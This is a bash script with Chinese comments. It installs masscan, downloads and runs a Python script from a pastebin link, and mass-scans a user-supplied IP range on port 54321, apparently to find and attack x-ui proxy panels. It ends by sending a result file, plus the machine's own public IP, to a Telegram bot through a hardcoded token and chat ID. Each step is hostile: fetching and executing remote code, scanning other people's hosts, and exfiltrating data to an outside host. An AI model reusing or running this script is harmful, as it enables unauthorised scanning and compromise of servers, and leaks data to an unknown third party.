#! /bin/bash
upd(){
    apt-get update
    apt-get upgrade
    apt install masscan
    apt install libpcap-dev
    apt install python
    pip3 install requests
}

pyzt(){
    curl -o xui.py https://pastebin.com/raw/xfdu7AKd
}

cvv(){
    python3 xui.py
}

tgbots(){
    echo "这台机器的IP是`curl ip.sb`" >> result.txt
    TOKEN=5677739231:AAG6zUBUJg2AQL9lxplHQBba1V5dNnVZnq4	#TG机器人token
    chat_ID=5770708575		#用户ID或频道、群ID
    message_text=`cat result.txt`		#要发送的信息
    MODE='HTML'		#解析模式，可选HTML或Markdown
    URL="https://api.telegram.org/bot${TOKEN}/sendMessage"		#api接口
    curl -s -X POST $URL -d chat_id=${chat_ID}  -d parse_mode=${MODE} -d text="${message_text}"  >> /dev/null
}
upd
pyzt
echo "输入你的IP段"
read sbip
echo "输入你的最大发包数"
read fucku
masscan -p54321 ${sbip} --max-rate ${fucku} -oG results.txt
cvv
tgbots


